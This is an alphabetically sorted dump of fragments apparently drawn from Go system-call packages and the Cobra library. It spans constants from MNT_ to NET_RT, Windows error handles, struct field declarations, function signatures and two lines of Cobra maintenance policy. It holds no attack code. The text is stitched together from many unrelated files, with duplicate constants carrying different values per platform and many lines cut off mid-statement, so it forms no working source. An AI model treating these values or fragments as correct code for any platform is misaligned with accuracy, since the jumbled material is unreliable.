MK_S_US                                                                   Handle        = 0x000401E6
MMASK   = 0x0017
MNT)_/ 
MNT_ACLS                       = 0x8000000
MNT_ASYNC                               = 0x40
MNT_ASYNC                         = 0x40
MNT_ASYNC                      = 0x40
MNT_AUTOMOUNTED                         = 0x400000
MNT_AUTOMOUNTED                   = 0x20
MNT_AUTOMOUNTED                = 0x200000000
MNT_BASIC_FLAGS                   = 0xe782807f
MNT_BYFSID                     = 0x8000000
MNT_CMDFLAGS                            = 0xf0000
MNT_CMDFLAGS                      = 0xf0000
MNT_CMDFLAGS                   = 0xd0f0000
MNT_CPROTECT                            = 0x80
MNT_DEFEXPORTED                   = 0x200
MNT_DEFEXPORTED                = 0x200
MNT_DEFWRITE                            = 0x2000000
MNT_DELEXPORT                     = 0x20000
MNT_DELEXPORT                  = 0x20000
MNT_DETACH                                  = 0x2
MNT_DISCARD                       = 0x800000
MNT_DONTBROWSE                          = 0x100000
MNT_DOOMED                        = 0x8000000
MNT_DOVOLFS                             = 0x8000
MNT_DWAIT                               = 0x4
MNT_EXKERB                        = 0x800
MNT_EXKERB                     = 0x800
MNT_EXNORESPORT                   = 0x8000000
MNT_EXPIRE                                  = 0x4
MNT_EXPORTANON                    = 0x400
MNT_EXPORTANON                 = 0x400
MNT_EXPORTED                            = 0x100
MNT_EXPORTED                      = 0x100
MNT_EXPORTED                   = 0x100
MNT_EXPUBLIC                      = 0x10000000
MNT_EXPUBLIC                      = 0x20000000
MNT_EXPUBLIC                   = 0x20000000
MNT_EXRDONLY                      = 0x80
MNT_EXRDONLY                   = 0x80
MNT_EXTATTR                       = 0x1000000
MNT_EXT_ROOT_DATA_VOL                   = 0x1
MNT_FORCE                                   = 0x1
MNT_FORCE                               = 0x80000
MNT_FORCE                         = 0x80000
MNT_FORCE                      = 0x80000
MNT_GETARGS                       = 0x400000
MNT_GJOURNAL                   = 0x2000000
MNT_IGNORE                        = 0x100000
MNT_IGNORE                        = 0x800000
MNT_IGNORE                     = 0x800000
MNT_IGNORE_OWNERSHIP                    = 0x200000
MNT_JOURNALED                           = 0x800000
MNT_LAZY                          = 0x3
MNT_LAZY                          = 0x4
MNT_LAZY                       = 0x3
MNT_LOCAL                               = 0x1000
MNT_LOCAL                         = 0x1000
MNT_LOCAL                      = 0x1000
MNT_LOG                           = 0x2000000
MNT_MULTILABEL                          = 0x4000000
MNT_MULTILABEL                 = 0x4000000
MNT_NFS4ACLS                   = 0x10
MNT_NOATIME                             = 0x10000000
MNT_NOATIME                       = 0x10000000
MNT_NOATIME                       = 0x4000000
MNT_NOATIME                       = 0x8000
MNT_NOATIME                    = 0x10000000
MNT_NOBLOCK                             = 0x20000
MNT_NOCLUSTERR                    = 0x40000000
MNT_NOCLUSTERR                 = 0x40000000
MNT_NOCLUSTERW                    = 0x80000000
MNT_NOCLUSTERW                 = 0x80000000
MNT_NOCOREDUMP                    = 0x8000
MNT_NODEV                               = 0x10
MNT_NODEV                         = 0x10
MNT_NODEVMTIME                    = 0x40000000
MNT_NOEXEC                              = 0x4
MNT_NOEXEC                        = 0x4
MNT_NOEXEC                     = 0x4
MNT_NONBUSY                    = 0x4000000
MNT_NOPERM                        = 0x20
MNT_NOSUID                              = 0x8
MNT_NOSUID                        = 0x8
MNT_NOSUID                     = 0x8
MNT_NOSYMFOLLOW                   = 0x400000
MNT_NOSYMFOLLOW                = 0x400000
MNT_NOUSERXATTR                         = 0x1000000
MNT_NOWAIT                              = 0x2
MNT_NOWAIT                        = 0x2
MNT_NOWAIT                     = 0x2
MNT_OP_FLAGS                      = 0x4d0000
MNT_QUARANTINE                          = 0x400
MNT_QUOTA                               = 0x2000
MNT_QUOTA                         = 0x2000
MNT_QUOTA                      = 0x2000
MNT_RDONLY                              = 0x1
MNT_RDONLY                        = 0x1
MNT_RDONLY                     = 0x1
MNT_RELATIME                      = 0x20000
MNT_RELOAD                              = 0x40000
MNT_RELOAD                        = 0x40000
MNT_RELOAD                     = 0x40000
MNT_REMOVABLE                           = 0x200
MNT_ROOTFS                              = 0x4000
MNT_ROOTFS                        = 0x4000
MNT_ROOTFS                     = 0x4000
MNT_SNAPSHOT                            = 0x40000000
MNT_SNAPSHOT                   = 0x1000000
MNT_SOFTDEP                       = 0x200000
MNT_SOFTDEP                       = 0x4000000
MNT_SOFTDEP                       = 0x80000000
MNT_SOFTDEP                    = 0x200000
MNT_STALLED                       = 0x100000
MNT_STRICTATIME                         = 0x80000000
MNT_SUIDDIR                       = 0x100000
MNT_SUIDDIR                    = 0x100000
MNT_SUJ                        = 0x100000000
MNT_SUSPEND                    = 0x4
MNT_SWAPPABLE                     = 0x200000
MNT_SYMPERM                       = 0x20000000
MNT_SYNCHRONOUS                         = 0x2
MNT_SYNCHRONOUS                   = 0x2
MNT_SYNCHRONOUS                = 0x2
MNT_TRIM                          = 0x1000000
MNT_UNION                               = 0x20
MNT_UNION                         = 0x20
MNT_UNION                      = 0x20
MNT_UNKNOWNPERMISSIONS                  = 0x200000
MNT_UNTRUSTED                  = 0x800000000
MNT_UPDATE                              = 0x10000
MNT_UPDATE                        = 0x10000
MNT_UPDATE                     = 0x10000
MNT_UPDATEMASK                 = 0x2d8d0807e
MNT_UPDATEMASK                 = 0xad8d0807e
MNT_USER                          = 0x8000
MNT_USER                       = 0x8000
MNT_VERIFIED                   = 0x400000000
MNT_VISFLAGMASK                         = 0xd7f0f7ff
MNT_VISFLAGMASK                   = 0x400ffff
MNT_VISFLAGMASK                   = 0xf1f0ffff
MNT_VISFLAGMASK                   = 0xff90ffff
MNT_VISFLAGMASK                = 0x3fef0ffff
MNT_VISFLAGMASK                = 0xffef0ffff
MNT_WAIT                                = 0x1
MNT_WAIT                          = 0x1
MNT_WAIT                       = 0x1
MNT_WANTRDWR                      = 0x2000000
MNT_WXALLOWED                     = 0x800
MODULE_INIT_/ 
MODULE_INIT_COMPRESSED_FILE                 = 0x4
MODULE_INIT_IGNORE_MODVERSIONS              = 0x1
MODULE_INIT_IGNORE_VERMAGIC                 = 0x2
MORDER  = 0x0003
MOUNT
MOUNTEDOVER        = 0x40000000
MOUNT_ATTR_IDMAP                            = 0x100000
MOUNT_ATTR_NOATIME                          = 0x10
MOUNT_ATTR_NODEV                            = 0x4
MOUNT_ATTR_NODIRATIME                       = 0x80
MOUNT_ATTR_NOEXEC                           = 0x8
MOUNT_ATTR_NOSUID                           = 0x2
MOUNT_ATTR_NOSYMFOLLOW                      = 0x200000
MOUNT_ATTR_RDONLY                           = 0x1
MOUNT_ATTR_RELATIME                         = 0x0
MOUNT_ATTR_SIZE_VER0                        = 0x20
MOUNT_ATTR_STRICTATIME                      = 0x20
MOUNT_ATTR__ATIME                           = 0x70
MOVD
MOVEFILE_COPY_ALLOWED          = 0x2
MOVEFILE_CREATE_HARDLINK       = 0x10
MOVEFILE_DELAY_UNTIL_REBOOT    = 0x4
MOVEFILE_FAIL_IF_NOT_TRACKABLE = 0x20
MOVEFILE_REPLACE_EXISTING      = 0x1
MOVEFILE_WRITE_THROUGH         = 0x8
MOVE_MOUNT_F_AUTOMOUNTS = 0x2
MOVE_MOUNT_F_EMPTY_PATH = 0x4
MOVE_MOUNT_F_SYMLINKS   = 0x1
MOVE_MOUNT_SET_GROUP    = 0x100
MOVE_MOUNT_T_AUTOMOUNTS = 0x20
MOVE_MOUNT_T_EMPTY_PATH = 0x40
MOVE_MOUNT_T_SYMLINKS   = 0x10
MOVL
MOVQ
MOVV
MOVW
MOVWZ
MPLS_IPTUNNEL_DST    = 0x1
MPLS_IPTUNNEL_MAX    = 0x2
MPLS_IPTUNNEL_TTL    = 0x2
MPLS_IPTUNNEL_UNSPEC = 0x0
MREPL   = 0x0000
MSDOS_SUPER_MAGIC                           = 0x4d44
MSDTC_E_DUPLICATE_RESOURCE                                                Handle        = 0x80110701
MSGQUEUE
MSG_ACK_EXPECTED                = 0x10
MSG_ACK_GEN                     = 0x40
MSG_ACK_TIMEOUT                 = 0x20
MSG_ANY                       = 0x4
MSG_ARGEXT                    = 0x400
MSG_BAND                      = 0x2
MSG_BATCH                                   = 0x40000
MSG_BCAST                         = 0x100
MSG_BCAST  = 0x0400
MSG_CMSG_CLOEXEC                            = 0x40000000
MSG_CMSG_CLOEXEC                  = 0x1000
MSG_CMSG_CLOEXEC                  = 0x800
MSG_CMSG_CLOEXEC               = 0x40000
MSG_COMPAT                     = 0x8000
MSG_COMPAT                    = 0x8000
MSG_CONFIRM                                 = 0x800
MSG_CONNTERM                    = 0x80
MSG_CONTROLMBUF                   = 0x2000000
MSG_CTRUNC                                  = 0x8
MSG_CTRUNC                              = 0x20
MSG_CTRUNC                        = 0x20
MSG_CTRUNC                      = 0x20
MSG_CTRUNC                     = 0x20
MSG_CTRUNC                    = 0x10
MSG_CTRUNC                    = 0x20
MSG_CTRUNC = 0x0200
MSG_DONTROUTE                               = 0x4
MSG_DONTROUTE                           = 0x4
MSG_DONTROUTE                     = 0x4
MSG_DONTROUTE                   = 0x4
MSG_DONTROUTE                  = 0x4
MSG_DONTROUTE                 = 0x4
MSG_DONTROUTE = 0x4
MSG_DONTWAIT                                = 0x40
MSG_DONTWAIT                            = 0x80
MSG_DONTWAIT                      = 0x80
MSG_DONTWAIT                   = 0x80
MSG_DONTWAIT                  = 0x80
MSG_DUPCTRL                   = 0x800
MSG_EOF                                 = 0x100
MSG_EOF                           = 0x100
MSG_EOF                         = 0x8000
MSG_EOF                        = 0x100
MSG_EOR                                     = 0x80
MSG_EOR                                 = 0x8
MSG_EOR                           = 0x8
MSG_EOR                         = 0x8
MSG_EOR                        = 0x8
MSG_EOR                       = 0x8
MSG_ERRQUEUE                                = 0x2000
MSG_FASTOPEN                                = 0x20000000
MSG_FBLOCKING                     = 0x10000
MSG_FIN                                     = 0x200
MSG_FLUSH                               = 0x400
MSG_FMASK                         = 0xffff0000
MSG_FNONBLOCKING                  = 0x20000
MSG_HAVEMORE                            = 0x2000
MSG_HIPRI                     = 0x1
MSG_HOLD                                = 0x800
MSG_IOVUSRSPACE                   = 0x4000000
MSG_LENUSRSPACE                   = 0x8000000
MSG_MAXIOVLEN                   = 16
MSG_MAXIOVLEN                 = 0x10
MSG_MCAST                         = 0x200
MSG_MCAST  = 0x0800
MSG_MORE                                    = 0x8000
MSG_MPEG2                     = 0x80
MSG_NAMEMBUF                      = 0x1000000
MSG_NBIO                          = 0x1000
MSG_NBIO                       = 0x4000
MSG_NEEDSA                              = 0x10000
MSG_NONBLOCK                    = 0x4000
MSG_NONBLOCK                  = 0x4000
MSG_NOSIGNAL                                = 0x4000
MSG_NOSIGNAL                            = 0x80000
MSG_NOSIGNAL                      = 0x400
MSG_NOSIGNAL                   = 0x20000
MSG_NOSIGNAL                  = 0x100
MSG_NOSIGNAL                  = 0x200
MSG_NOTIFICATION               = 0x2000
MSG_NOTIFICATION              = 0x100
MSG_OOB                                     = 0x1
MSG_OOB                                 = 0x1
MSG_OOB                           = 0x1
MSG_OOB                         = 0x1
MSG_OOB                        = 0x1
MSG_OOB                       = 0x1
MSG_OOB       = 0x1
MSG_PEEK                                    = 0x2
MSG_PEEK                                = 0x2
MSG_PEEK                          = 0x2
MSG_PEEK                        = 0x2
MSG_PEEK                       = 0x2
MSG_PEEK                      = 0x2
MSG_PEEK      = 0x2
MSG_PROXY                                   = 0x10
MSG_RCVMORE                             = 0x4000
MSG_RST                                     = 0x1000
MSG_SEND                                = 0x1000
MSG_SYN                                     = 0x400
MSG_SYNC                          = 0x800
MSG_TRUNC                                   = 0x20
MSG_TRUNC                               = 0x10
MSG_TRUNC                         = 0x10
MSG_TRUNC                       = 0x10
MSG_TRUNC                      = 0x10
MSG_TRUNC                     = 0x10
MSG_TRUNC                     = 0x20
MSG_TRUNC  = 0x0100
MSG_TRYHARD                                 = 0x4
MSG_UNUSED09                      = 0x200
MSG_USERFLAGS                     = 0xffffff
MSG_WAITALL                                 = 0x100
MSG_WAITALL                             = 0x40
MSG_WAITALL                       = 0x40
MSG_WAITALL                     = 0x40
MSG_WAITALL                    = 0x40
MSG_WAITALL                   = 0x40
MSG_WAITALL   = 0x8
MSG_WAITFORONE                              = 0x10000
MSG_WAITFORONE                 = 0x80000
MSG_WAITFORONE                = 0x200
MSG_WAITSTREAM                          = 0x200
MSG_XPG4_2                    = 0x8000
MSG_ZEROCOPY                                = 0x4000000
MSPAR
MSSIPOTF_E_BADVERSION                                                     Handle        = 0x80097015
MSSIPOTF_E_BAD_FIRST_TABLE_PLACEMENT                                      Handle        = 0x80097008
MSSIPOTF_E_BAD_MAGICNUMBER                                                Handle        = 0x80097004
MSSIPOTF_E_BAD_OFFSET_TABLE                                               Handle        = 0x80097005
MSSIPOTF_E_CANTGETOBJECT                                                  Handle        = 0x80097002
MSSIPOTF_E_CRYPT                                                          Handle        = 0x80097014
MSSIPOTF_E_DSIG_STRUCTURE                                                 Handle        = 0x80097016
MSSIPOTF_E_FAILED_HINTS_CHECK                                             Handle        = 0x80097011
MSSIPOTF_E_FAILED_POLICY                                                  Handle        = 0x80097010
MSSIPOTF_E_FILE                                                           Handle        = 0x80097013
MSSIPOTF_E_FILETOOSMALL                                                   Handle        = 0x8009700B
MSSIPOTF_E_FILE_CHECKSUM                                                  Handle        = 0x8009700D
MSSIPOTF_E_NOHEADTABLE                                                    Handle        = 0x80097003
MSSIPOTF_E_NOT_OPENTYPE                                                   Handle        = 0x80097012
MSSIPOTF_E_OUTOFMEMRANGE                                                  Handle        = 0x80097001
MSSIPOTF_E_PCONST_CHECK                                                   Handle        = 0x80097017
MSSIPOTF_E_STRUCTURE                                                      Handle        = 0x80097018
MSSIPOTF_E_TABLES_OVERLAP                                                 Handle        = 0x80097009
MSSIPOTF_E_TABLE_CHECKSUM                                                 Handle        = 0x8009700C
MSSIPOTF_E_TABLE_LONGWORD                                                 Handle        = 0x80097007
MSSIPOTF_E_TABLE_PADBYTES                                                 Handle        = 0x8009700A
MSSIPOTF_E_TABLE_TAGORDER                                                 Handle        = 0x80097006
MS_ACTIVE                                   = 0x40000000
MS_ASYNC                                    = 0x1
MS_ASYNC                                = 0x1
MS_ASYNC                          = 0x1
MS_ASYNC                        = 0x2 // asynchronous writes
MS_ASYNC                       = 0x1
MS_ASYNC                      = 0x1
MS_ASYNC                      = 0x10
MS_BIND                                     = 0x1000
MS_BORN                                     = 0x20000000
MS_DEACTIVATE                           = 0x8
MS_DIRSYNC                                  = 0x80
MS_EINTR                      = 0x80
MS_INVALIDATE                               = 0x2
MS_INVALIDATE                           = 0x2
MS_INVALIDATE                     = 0x2
MS_INVALIDATE                     = 0x4
MS_INVALIDATE                   = 0x4 // invalidate mappings
MS_INVALIDATE                  = 0x2
MS_INVALIDATE                 = 0x2
MS_INVALIDATE                 = 0x40
MS_I_VERSION                                = 0x800000
MS_KERNMOUNT                                = 0x400000
MS_KILLPAGES                            = 0x4
MS_LAZYTIME                                 = 0x2000000
MS_MANDLOCK                                 = 0x40
MS_MGC_MSK                                  = 0xffff0000
MS_MGC_VAL                                  = 0xc0ed0000
MS_MOVE                                     = 0x2000
MS_NOATIME                                  = 0x400
MS_NODEV                                    = 0x4
MS_NODIRATIME                               = 0x800
MS_NOEXEC                                   = 0x8
MS_NOREMOTELOCK                             = 0x8000000
MS_NOSEC                                    = 0x10000000
MS_NOSUID                                   = 0x2
MS_NOSYMFOLLOW                              = 0x100
MS_NOUSER                                   = -0x80000000
MS_OLDSYNC                    = 0x0
MS_PER_SEC                    = 0x3e8
MS_POSIXACL                                 = 0x10000
MS_PRIVATE                                  = 0x40000
MS_RDONLY                                   = 0x1
MS_REC                                      = 0x4000
MS_RELATIME                                 = 0x200000
MS_REMOUNT                                  = 0x20
MS_RMT_MASK                                 = 0x2800051
MS_SHARED                                   = 0x100000
MS_SILENT                                   = 0x8000
MS_SLAVE                                    = 0x80000
MS_STRICTATIME                              = 0x1000000
MS_SUBMOUNT                                 = 0x4000000
MS_SYNC                                     = 0x4
MS_SYNC                                 = 0x10
MS_SYNC                           = 0x0
MS_SYNC                           = 0x2
MS_SYNC                           = 0x4
MS_SYNC                         = 0x1 // msync - synchronous writes
MS_SYNC                        = 0x0
MS_SYNC                       = 0x20
MS_SYNC                       = 0x4
MS_SYNCHRONOUS                              = 0x10
MS_UNBINDABLE                               = 0x20000
MS_VERBOSE                                  = 0x8000
MTD/ 
MTDFILEMODE                      = 0x20004d13
MTDFILEMODE                      = 0x4d13
MTD_ABSENT                                  = 0x0
MTD_BIT_WRITEABLE                           = 0x800
MTD_CAP_NANDFLASH                           = 0x400
MTD_CAP_NORFLASH                            = 0xc00
MTD_CAP_NVRAM                               = 0x1c00
MTD_CAP_RAM                                 = 0x1c00
MTD_CAP_ROM                                 = 0x0
MTD_DATAFLASH                               = 0x6
MTD_FILE_MODE_NORMAL      = 0x0
MTD_FILE_MODE_OTP_FACTORY = 0x1
MTD_FILE_MODE_OTP_USER    = 0x2
MTD_FILE_MODE_RAW         = 0x3
MTD_INODE_FS_MAGIC                          = 0x11307854
MTD_MAX_ECCPOS_ENTRIES                      = 0x40
MTD_MAX_OOBFREE_ENTRIES                     = 0x8
MTD_MLCNANDFLASH                            = 0x8
MTD_NANDECC_AUTOPLACE                       = 0x2
MTD_NANDECC_AUTOPL_USR                      = 0x4
MTD_NANDECC_OFF                             = 0x0
MTD_NANDECC_PLACE                           = 0x1
MTD_NANDECC_PLACEONLY                       = 0x3
MTD_NANDFLASH                               = 0x4
MTD_NORFLASH                                = 0x3
MTD_NO_ERASE                                = 0x1000
MTD_OPS_AUTO_OOB  = 0x1
MTD_OPS_PLACE_OOB = 0x0
MTD_OPS_RAW       = 0x2
MTD_OTP_FACTORY                             = 0x1
MTD_OTP_OFF                                 = 0x0
MTD_OTP_USER                                = 0x2
MTD_POWERUP_LOCK                            = 0x2000
MTD_RAM                                     = 0x1
MTD_ROM                                     = 0x2
MTD_SLC_ON_MLC_EMULATION                    = 0x4000
MTD_UBIVOLUME                               = 0x7
MTD_WRITEABLE                               = 0x400
MTM_DRAIN                       = 0x02000000
MTM_FORCE                       = 0x04000000
MTM_IMMED                       = 0x08000000
MTM_NOSECURITY                  = 0x00000080
MTM_NOSUID                      = 0x00000400
MTM_RDONLY                      = 0x80000000
MTM_RDWR                        = 0x40000000
MTM_REMOUNT                     = 0x00000100
MTM_RESET                       = 0x01000000
MTM_SAMEMODE                    = 0x00100000
MTM_SYNCHONLY                   = 0x00000200
MTM_UMOUNT                      = 0x10000000
MTM_UNQSEFORCE                  = 0x00040000
MTU  int32
MUI_COMPLEX_SCRIPT_FILTER          = 0x200
MUI_CONSOLE_FILTER                 = 0x100
MUI_FILEINFO_VERSION               = 0x001
MUI_FILETYPE_LANGUAGE_NEUTRAL_MAIN = 0x002
MUI_FILETYPE_LANGUAGE_NEUTRAL_MUI  = 0x004
MUI_FILETYPE_NOT_LANGUAGE_NEUTRAL  = 0x001
MUI_FULL_LANGUAGE      = 0x01
MUI_LANGUAGE_ID                    = 0x4
MUI_LANGUAGE_INSTALLED = 0x20
MUI_LANGUAGE_LICENSED  = 0x40
MUI_LANGUAGE_NAME                  = 0x8
MUI_LANG_NEUTRAL_PE_FILE           = 0x100
MUI_LIP_LANGUAGE       = 0x04
MUI_MACHINE_LANGUAGE_SETTINGS      = 0x400
MUI_MERGE_SYSTEM_FALLBACK          = 0x10
MUI_MERGE_USER_FALLBACK            = 0x20
MUI_NON_LANG_NEUTRAL_FILE          = 0x200
MUI_PARTIAL_LANGUAGE   = 0x02
MUI_QUERY_CHECKSUM                 = 0x002
MUI_QUERY_LANGUAGE_NAME            = 0x004
MUI_QUERY_RESOURCE_TYPES           = 0x008
MUI_QUERY_TYPE                     = 0x001
MUI_RESET_FILTERS                  = 0x001
MUI_THREAD_LANGUAGES               = 0x40
MUI_UI_FALLBACK                    = MUI_MERGE_SYSTEM_FALLBACK 
MUI_USER_PREFERRED_UI_LANGUAGES    = 0x10
MUI_USE_INSTALLED_LANGUAGES        = 0x20
MUI_USE_SEARCH_ALL_LANGUAGES       = 0x40
MUTANT_ALL_ACCESS  = STANDARD_RIGHTS_REQUIRED 
MUTANT_QUERY_STATE = 0x0001
MUTEX_ALL_ACCESS   = MUTANT_ALL_ACCESS
MUTEX_MODIFY_STATE = MUTANT_QUERY_STATE
M_FLUSH                       = 0x86
Mac         uint16
Mac       uint16
Mac     uint16
Machine    [65]byte
Machine  [256]byte
Machine  [257]byte
Machine  [32]byte
MachineName
Magic  uint32
Maintainers will ensure the Cobra test suite utilizes the current supported versions of Golang.
Maintainers will make every effort to release security patches in the case of a medium to high severity CVE directly impacting the library. The speed in which these patches reach a release is up to the discretion of the maintainers. A low severity CVE may be a lower priority than a high severity one.
Majflt   int32
Majflt   int64
Major uint16
MajorVersion      uint32
Major_rev_num  uint16
MappedBase       uintptr
MarkFlagCustom()
MarkFlagDirname()
MarkFlagFilename()
MarkPersistentFlagDirname()
MarkPersistentFlagFilename()
Mask            uint32
Mask         uint64
Mask        uint32
Mask    uint32
Mask   uint32
Mask  uint32
Mask uint32
Mask uint64
Master_key_descriptor     [8]uint8
Master_key_identifier     [16]uint8
MatchAll(pargs ...PositionalArgs)
Max     int32
Max int64
Max uint32
Max uint64
MaxHostNameLen = 0x100
MaxSockAddr       int32
MaxSockets   uint16
MaxTokenInfoClass
MaxUdpDg     uint16
Max_keysize uint32
Max_multsect   uint8
Maxauthsize uint32
Maxerror  int32
Maxerror  int64
Maxfilesize int64
MaximumLength uint16
MaximumNArgs(int)
MaximumWindowSize Coord
MaximumWorkingSetSize   uintptr
Maxlen int32
Maxrss   int32
Maxrss   int64
Maxseg              uint32
Mbcnt uint32
Mbmax uint32
Mclpool      [7]Mclpool
Mday  int32
MenuComplete
MessageSize       uint32
Metadata_len uint16
Metric       uint32
Metric      uint32
Metric      uint64
Metric     uint32
Metric     uint64
Metric    int32
Metric  int32
MibIfRow) (errcode error) = iphlpapi.GetIfEntry
MibIfRow) (errcode error) {
Milliseconds uint16
Min     int32
Min   int32
MinSockAddr       int32
Min_keysize uint32
Minflt   int32
Minflt   int64
MinimumNArgs(int)
MinimumWorkingSetSize   uintptr
Minor uint16
MinorVersion      uint32
Minor_rev_num  uint16
Minute       uint16
Minuteswest int32
Mksysnum is a Go program located at 
Mlock(b []byte) (err error)
Mlockall(flags int) (err error)
Mnt_id          uint64
Mntfromname [1024]byte
Mntfromname [80]byte
Mntfromname [88]byte
Mntonname   [1024]byte
Mntonname   [80]byte
Mntonname   [88]byte
ModBaseAddr  uintptr
ModBaseSize  uint32
Mode              uint32
Mode            uint16
Mode           uint32
Mode          int32
Mode         int32
Mode         uint32
Mode       uint32
Mode     uint32
Mode    uint16
Mode    uint32
Mode    uint64
Mode   uint32 // permissions
Mode   uint8
Mode uint16
Mode uint32
Mode:   
Model          [40]uint8
Modes     uint32
Modifications
Modtime int32
Modtime int64
Module       [MAX_MODULE_NAME32 
ModuleEntry32) (err error) = kernel32.Module32FirstW
ModuleEntry32) (err error) = kernel32.Module32NextW
ModuleEntry32) (err error) {
ModuleHandle Handle
ModuleID        uint32
ModuleID     uint32
Module_name [64]int8
Module_name [64]uint8
Modules         [1]RTL_PROCESS_MODULE_INFORMATION
Mon   int32
Month        uint16
More documentation about flags is available at https://github.com/spf13/pflag
More in [viper documentation](https://github.com/spf13/viper
MountAttr) error {
Mount_info    [160]byte
Mountpoint   [1024]byte
MoveFile(from 
MoveFileEx(from 
Mpls     uint8
Mprc           uint16
Mq        uint32
Msg     string
Msg   NlMsghdr
Msg  string
Msghdr) SetControllen(length int) {
Msghdr) SetIovlen(length int) {
Msglen    uint16
Msglen   uint16
Msglen  uint16
Msgrcv   int32
Msgrcv   int64
Msgsnd   int32
Msgsnd   int64
Msl       uint64
Msr       uint32
Msr       uint64
Msrqs          uint16
Mssopt    uint16
MtdEccStats struct {
MtdInfo struct {
MtdOobBuf struct {
MtdOobBuf64 struct {
MtdWriteReq struct {
Mtim           Timespec
Mtim      Time_t
Mtim     Timespec
Mtim    Timespec
Mtim Timespec
Mtim31       [4]byte
Mtime           StatxTimestamp
Mtime      uint32
Mtime  uint32 // last write time
Mtime:  
Mtime_nsec uint32
Mtu                   uint32
Mtu             uint32
Mtu          uint32
Mtu         uint32
Mtu         uint64
Mtu        uint32
Mtu        uint64
Mtu       uint64
Mtu      uint32
Mtu      uint64
Mtu  uint32
Muid   string // last modifier name
Multiaddr [16]byte /
Multiaddr [4]byte /
MultipleTrustee          
MultipleTrusteeOperation MULTIPLE_TRUSTEE_OPERATION
Multsect       uint8
Multsect_valid uint8
Munlock(b []byte) (err error)
Munlockall() (err error)
MustConstraints()
NAME
NAME)_SIZE$/ 
NAME_MAX                                    = 0xff
NAME_MAX                                = 0xff
NAME_MAX                          = 0x1ff
NAME_MAX                          = 0xff
NAME_MAX                       = 0xff
NAME_MAX                      = 0xff
NAP_E_CONFLICTING_ID                                                      Handle        = 0x80270003
NAP_E_ENTITY_DISABLED                                                     Handle        = 0x8027000E
NAP_E_ID_NOT_FOUND                                                        Handle        = 0x8027000A
NAP_E_INVALID_PACKET                                                      Handle        = 0x80270001
NAP_E_MAXSIZE_TOO_SMALL                                                   Handle        = 0x8027000B
NAP_E_MISMATCHED_ID                                                       Handle        = 0x80270008
NAP_E_MISSING_SOH                                                         Handle        = 0x80270002
NAP_E_NETSH_GROUPPOLICY_ERROR                                             Handle        = 0x8027000F
NAP_E_NOT_INITIALIZED                                                     Handle        = 0x80270007
NAP_E_NOT_PENDING                                                         Handle        = 0x80270009
NAP_E_NOT_REGISTERED                                                      Handle        = 0x80270006
NAP_E_NO_CACHED_SOH                                                       Handle        = 0x80270004
NAP_E_SERVICE_NOT_RUNNING                                                 Handle        = 0x8027000C
NAP_E_SHV_CONFIG_EXISTED                                                  Handle        = 0x80270011
NAP_E_SHV_CONFIG_NOT_FOUND                                                Handle        = 0x80270012
NAP_E_SHV_TIMEOUT                                                         Handle        = 0x80270013
NAP_E_STILL_BOUND                                                         Handle        = 0x80270005
NAP_E_TOO_MANY_CALLS                                                      Handle        = 0x80270010
NAP_S_CERT_ALREADY_PRESENT                                                Handle        = 0x0027000D
NCP_SUPER_MAGIC                             = 0x564c
NCSI_ATTR_CHANNEL_ID            = 0x4
NCSI_ATTR_IFINDEX               = 0x1
NCSI_ATTR_PACKAGE_ID            = 0x3
NCSI_ATTR_PACKAGE_LIST          = 0x2
NCSI_ATTR_UNSPEC                = 0x0
NCSI_CHANNEL_ATTR               = 0x1
NCSI_CHANNEL_ATTR_ACTIVE        = 0x7
NCSI_CHANNEL_ATTR_FORCED        = 0x8
NCSI_CHANNEL_ATTR_ID            = 0x2
NCSI_CHANNEL_ATTR_LINK_STATE    = 0x6
NCSI_CHANNEL_ATTR_UNSPEC        = 0x0
NCSI_CHANNEL_ATTR_VERSION_MAJOR = 0x3
NCSI_CHANNEL_ATTR_VERSION_MINOR = 0x4
NCSI_CHANNEL_ATTR_VERSION_STR   = 0x5
NCSI_CHANNEL_ATTR_VLAN_ID       = 0xa
NCSI_CHANNEL_ATTR_VLAN_LIST     = 0x9
NCSI_CMD_CLEAR_INTERFACE        = 0x3
NCSI_CMD_PKG_INFO               = 0x1
NCSI_CMD_SET_INTERFACE          = 0x2
NCSI_CMD_UNSPEC                 = 0x0
NCSI_PKG_ATTR                   = 0x1
NCSI_PKG_ATTR_CHANNEL_LIST      = 0x4
NCSI_PKG_ATTR_FORCED            = 0x3
NCSI_PKG_ATTR_ID                = 0x2
NCSI_PKG_ATTR_UNSPEC            = 0x0
NDA_CACHEINFO      = 0x3
NDA_DST            = 0x1
NDA_IFINDEX        = 0x8
NDA_LINK_NETNSID   = 0xa
NDA_LLADDR         = 0x2
NDA_MASTER         = 0x9
NDA_PORT           = 0x6
NDA_PROBES         = 0x4
NDA_SRC_VNI        = 0xb
NDA_UNSPEC         = 0x0
NDA_VLAN           = 0x5
NDA_VNI            = 0x7
NETLINK_ADD_MEMBERSHIP                      = 0x1
NETLINK_AUDIT                               = 0x9
NETLINK_BROADCAST_ERROR                     = 0x4
NETLINK_CAP_ACK                             = 0xa
NETLINK_CONNECTOR                           = 0xb
NETLINK_CRYPTO                              = 0x15
NETLINK_DNRTMSG                             = 0xe
NETLINK_DROP_MEMBERSHIP                     = 0x2
NETLINK_ECRYPTFS                            = 0x13
NETLINK_EXT_ACK                             = 0xb
NETLINK_FIB_LOOKUP                          = 0xa
NETLINK_FIREWALL                            = 0x3
NETLINK_GENERIC                             = 0x10
NETLINK_GET_STRICT_CHK                      = 0xc
NETLINK_INET_DIAG                           = 0x4
NETLINK_IP6_FW                              = 0xd
NETLINK_ISCSI                               = 0x8
NETLINK_KOBJECT_UEVENT                      = 0xf
NETLINK_LISTEN_ALL_NSID                     = 0x8
NETLINK_LIST_MEMBERSHIPS                    = 0x9
NETLINK_NETFILTER                           = 0xc
NETLINK_NFLOG                               = 0x5
NETLINK_NO_ENOBUFS                          = 0x5
NETLINK_PKTINFO                             = 0x3
NETLINK_RDMA                                = 0x14
NETLINK_ROUTE                               = 0x0
NETLINK_RX_RING                             = 0x6
NETLINK_SCSITRANSPORT                       = 0x12
NETLINK_SELINUX                             = 0x7
NETLINK_SMC                                 = 0x16
NETLINK_SOCK_DIAG                           = 0x4
NETLINK_TX_RING                             = 0x7
NETLINK_UNUSED                              = 0x1
NETLINK_USERSOCK                            = 0x2
NETLINK_XFRM                                = 0x6
NETNSA)_/ 
NETNSA_CURRENT_NSID = 0x5
NETNSA_FD           = 0x3
NETNSA_MAX                                  = 0x5
NETNSA_NONE         = 0x0
NETNSA_NSID         = 0x1
NETNSA_NSID_NOT_ASSIGNED                    = -0x1
NETNSA_PID          = 0x2
NETNSA_TARGET_NSID  = 0x4
NET_RT
NET_RT_DUMP                             = 0x1
